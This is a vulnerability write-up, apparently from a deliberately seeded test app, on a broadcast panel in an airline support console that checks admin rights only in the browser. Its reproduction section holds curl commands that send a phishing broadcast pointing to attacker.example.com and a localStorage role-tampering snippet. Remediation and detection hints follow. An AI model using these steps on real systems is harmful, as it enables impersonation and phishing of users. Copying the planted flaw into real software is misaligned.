# VULN-172 — Client-side-only authorisation on the operations broadcast panel

| Field | Value |
|-------|-------|
| ID | VULN-172 |
| Domain | frontend / platform support console |
| CWE | CWE-602 (Client-Side Enforcement of Server-Side Security) / CWE-862 (Missing Authorization) |
| OWASP Top 10 (2021) | A01:2021 – Broken Access Control |
| Severity | High |
| Location | `backend/app/routers/platform_support.py:85-117` (no role dependency), `frontend/src/app/pages/support.page.ts` (`isAdmin` CSS/role gate) |
| Introduced by | Workstream 12 — platform (`devin/iberia-platform`) |

## Description

The `/support` page shows an "Operations broadcast — admin only" panel that sends a message to
every passenger in an audience. The privilege check exists **only in the React component**: the
panel is rendered for everyone and merely hidden with an inline style driven by the client-side
role read out of `localStorage`:

```tsx
const isAdmin = user?.role === 'admin'
...
<div className="card" style={{ display: isAdmin ? 'block' : 'none' }}>
```

The endpoint behind it depends on `current_user` only — there is no
`require_roles("admin", "ops")` — so **any authenticated user**, including a `customer`, can send
a passenger-wide broadcast. The client-side gate is trivially bypassed either by calling the API
directly or by editing the cached `iberia.user` role (`localStorage.setItem('iberia.user', ...)`)
to make the panel appear.

## Reproduction

```bash
# obtain a plain customer token
TOKEN=$(curl -s -X POST http://127.0.0.1:8000/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"customer@iberia.demo","password":"Iberia2026!"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')

# the "admin only" action succeeds for a customer
curl -s -X POST http://127.0.0.1:8000/api/platform/support/broadcast \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"subject":"Free upgrades","body":"<p>Claim at attacker.example.com</p>","audience":"all"}'
# 201 {"id":1,"audience":"all","sent_by":"customer@iberia.demo",...}
```

Browser bypass of the CSS gate:

```js
const u = JSON.parse(localStorage.getItem('iberia.user')); u.role = 'admin'
localStorage.setItem('iberia.user', JSON.stringify(u)); window.dispatchEvent(new Event('iberia:session'))
// the admin panel is now visible and fully functional
```

Expected insecure result: HTTP 201 with the broadcast attributed to a non-privileged user, and
the record visible to everyone via `GET /api/platform/support/broadcasts`.

## Blast radius

Any passenger account can impersonate Iberia operations to the whole passenger base — a
ready-made phishing channel (the body is stored and rendered as HTML, so it chains with
VULN-170) plus reputational and regulatory exposure. The same pattern also makes the broadcast
history readable by any authenticated caller.

## Intended remediation

* Enforce authorisation server-side: `user: User = Depends(require_roles("admin", "ops"))` on
  `POST /api/platform/support/broadcast` (and on the broadcast listing).
* Treat the frontend gate as UX only, and derive the role from the verified token server-side —
  never from client storage.
* Add an audit entry per broadcast and rate-limit the endpoint.
* Add a negative test asserting 403 for `customer`/`agent` tokens.

## Detection hints

* Grep routers for state-changing handlers whose only auth dependency is `current_user`
  (`Depends(current_user)` without a nearby `require_roles`).
* Grep the frontend for `role === 'admin'` / `display: ... ? 'block' : 'none'` guarding actions.
* Test: `backend/tests/test_platform_support.py::test_broadcast_has_no_server_side_role_check`.
